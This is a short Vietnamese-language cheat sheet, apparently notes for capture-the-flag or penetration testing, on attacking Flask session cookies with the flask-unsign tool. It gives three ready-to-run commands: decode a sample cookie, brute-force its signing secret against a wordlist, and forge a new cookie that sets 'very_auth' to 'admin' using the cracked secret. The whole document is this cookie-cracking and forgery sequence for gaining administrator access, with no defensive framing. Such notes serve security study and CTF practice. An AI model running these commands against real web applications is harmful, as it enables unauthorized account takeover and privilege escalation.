# Flask Python

## Để decode cookie
```cmd
flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YN0XnA.7gxzLqrMvac6qFqngQVIbabvHAY' 
```

## Để dò secret
```cmd
flask-unsign --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YN0XnA.7gxzLqrMvac6qFqngQVIbabvHAY' --wordlist=worklist_cookie.txt
```

## Thay đổi cookie và bỏ secret vào
```cmd
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'peanut butter'
```
